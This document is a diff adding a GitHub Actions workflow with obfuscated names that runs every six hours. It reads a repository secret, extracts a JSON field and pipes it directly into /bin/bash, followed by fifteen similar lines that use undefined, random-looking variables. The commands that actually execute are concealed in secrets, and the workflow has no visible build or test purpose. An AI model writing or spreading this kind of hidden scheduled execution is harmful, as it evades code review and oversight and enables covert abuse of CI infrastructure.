@@ -1,0 +1,31 @@
+name: tongzhanggui0123
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: tongzhanggui0123
+        env:
+          qth81: ${{ secrets.qth81 }}
+        run: |
+          echo $qth81 | jq -r .sfc1 | /bin/bash
+          echo $gfwvv09026 | jq -r .awj1748 | /bin/bash
+          echo $gb20 | jq -r .buej018 | /bin/bash
+          echo $xbwv5 | jq -r .cqp64 | /bin/bash
+          echo $ytvf35243 | jq -r .mego20 | /bin/bash
+          echo $b42 | jq -r .xo5 | /bin/bash
+          echo $vd22395 | jq -r .t3266 | /bin/bash
+          echo $xf7 | jq -r .j2220 | /bin/bash
+          echo $r206 | jq -r .jbn469 | /bin/bash
+          echo $el14 | jq -r .v9 | /bin/bash
+          echo $mze102 | jq -r .dg5 | /bin/bash
+          echo $yron7 | jq -r .ows738 | /bin/bash
+          echo $g654 | jq -r .kfi02 | /bin/bash
+          echo $u82180 | jq -r .aumbb8382 | /bin/bash
+          echo $n3 | jq -r .nft05514 | /bin/bash
+          echo $pl2723 | jq -r .b783 | /bin/bash
+
